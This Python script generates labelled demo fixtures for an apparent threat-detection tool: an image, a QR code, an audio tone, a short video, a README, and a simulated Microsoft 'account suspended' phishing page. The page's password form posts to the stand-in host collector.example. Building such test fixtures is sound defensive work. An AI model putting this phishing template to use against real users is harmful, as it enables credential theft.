"""Safe, visibly labeled test artifacts; not ML training data or authenticity ground truth."""

import wave
from pathlib import Path
import cv2
import numpy as np
from PIL import Image, ImageDraw

root = Path("datasets/demo")
root.mkdir(parents=True, exist_ok=True)
image = Image.new("RGB", (640, 400), "#edf2ef")
draw = ImageDraw.Draw(image)
draw.text((30, 30), "ThreatGraph AI - deterministic test illustration", fill="#224b42")
draw.rectangle((30, 80, 280, 320), fill="#477b6e")
draw.ellipse((330, 90, 570, 330), fill="#92b7a2")
image.save(root / "illustration.png")
encoder = cv2.QRCodeEncoder_create()
qr = encoder.encode("https://example.com/")
qr = cv2.copyMakeBorder(qr, 4, 4, 4, 4, cv2.BORDER_CONSTANT, value=255)
cv2.imwrite(
    str(root / "qr-example.png"),
    cv2.resize(qr, (420, 420), interpolation=cv2.INTER_NEAREST),
)
t = np.arange(32000) / 16000
audio = (np.sin(2 * np.pi * 440 * t) * 0.1 * 32767).astype(np.int16)
with wave.open(str(root / "tone.wav"), "wb") as out:
    out.setnchannels(1)
    out.setsampwidth(2)
    out.setframerate(16000)
    out.writeframes(audio.tobytes())
writer = cv2.VideoWriter(
    str(root / "shapes.avi"), cv2.VideoWriter_fourcc(*"MJPG"), 10, (320, 240)
)
for i in range(30):
    frame = np.full((240, 320, 3), 230, dtype=np.uint8)
    cv2.circle(frame, (30 + i * 8, 120), 20, (80, 130, 90), -1)
    writer.write(frame)
writer.release()
(root / "simulated-phishing.html").write_text(
    '<!doctype html><html><title>SIMULATION ONLY</title><body><h1>Microsoft account suspended</h1><p>Verify immediately. This is an inert security testing fixture.</p><form action="https://collector.example/submit"><input type="password" name="password"></form></body></html>'
)
(root / "README.md").write_text(
    "# Safe local fixtures\n\nThese artifacts are programmatically generated test signals, not benchmark data. The illustration is not a natural photograph. The tone is not synthetic speech. The video has no human face or audio and should not receive a deepfake probability without an applicable model. Never use these samples to claim research accuracy. The phishing HTML is inert text inspected without script execution; never enter real credentials. QR points to example.com.\n"
)
print("Safe demo artifacts created:", root)
